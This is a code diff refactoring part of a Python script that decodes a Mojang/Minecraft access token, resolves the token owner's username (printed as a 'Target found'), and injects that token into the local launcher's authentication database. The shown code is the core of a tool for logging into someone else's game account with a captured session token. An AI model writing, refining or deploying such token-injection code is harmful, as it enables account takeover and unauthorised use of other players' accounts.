@@ -50,25 +50,21 @@ def get_time():
 def get_name(uuid):
     """ returns username from uuid """
     try:
-        res = requests.get(f"https://api.mojang.com/user/profiles/{uuid}/names")
-        data = res.json()
+        data = requests.get(f"https://api.mojang.com/user/profiles/{uuid}/names").json()
         return data[len(data) - 1]["name"]
     except Exception:
         pass
 
 def get_data(token):
     """ returns session ID, UUID and expiration date in unix epoch time format """
-    parts = token.split(".")
-    data = json.loads(base64.b64decode(f"{parts[1]}=".encode()).decode())
+    data = json.loads(base64.b64decode((token.split(".")[1] + "=").encode()).decode())
     return (data["spr"], data["sub"], data["exp"])
 
 def inject(profile):
     """ injects the new profile to the local authentication database """
     with open(PATH) as file:
         profiles = json.loads(file.read())
-    auth_db = profiles["authenticationDatabase"]
-    auth_db.update(profile)
-    profiles["authenticationDatabase"] = auth_db
+    profiles["authenticationDatabase"].update(profile)
     with open(PATH, "w") as file:
         file.write(json.dumps(profiles, indent=2))
 
@@ -111,7 +107,7 @@ def main():
             return
 
         print_info(f"Target found: '{name}'")
-
+        
         print_info(f"Injecting profile to authentication database at: '{PATH}'...")
 
         profile = {sid:{"accessToken":token,"profiles":{uuid:{"displayName":name}},"properties":[],"username":name}}
